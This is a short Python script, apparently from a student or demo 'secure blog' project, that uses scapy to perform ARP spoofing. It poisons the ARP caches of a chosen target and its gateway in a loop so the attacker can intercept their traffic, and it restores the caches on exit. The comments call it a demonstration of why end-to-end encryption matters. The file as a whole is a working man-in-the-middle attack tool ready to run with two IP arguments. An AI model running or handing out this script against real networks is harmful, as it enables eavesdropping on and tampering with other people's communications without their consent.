from scapy.all import *
import time
import os
import sys

# --- MITM / ARP ATTACK SCRIPT FOR SECURE BLOG PROJECT ---
# This script demonstrates how an attacker on the same network
# can intercept plaintext communication if E2EE is disabled.

def get_mac(ip):
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, verbose=False)
    if ans:
        return ans[0][1].hwsrc
    return None

def spoof(target_ip, host_ip):
    target_mac = get_mac(target_ip)
    if not target_mac:
        print(f"[!] Could not find MAC for {target_ip}")
        return
    # We tell the target that we are the host
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=host_ip)
    send(packet, verbose=False)

def restore(target_ip, host_ip):
    target_mac = get_mac(target_ip)
    host_mac = get_mac(host_ip)
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac)
    send(packet, count=4, verbose=False)

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: sudo python3 arp_attack.py <Target_IP> <Gateway_IP>")
        sys.exit(1)

    target = sys.argv[1]
    gateway = sys.argv[2]

    print(f"[*] Starting ARP spoofing against {target}...")
    try:
        while True:
            spoof(target, gateway)
            spoof(gateway, target)
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[*] Restoring network state...")
        restore(target, gateway)
        restore(gateway, target)
        print("[*] Finished.")
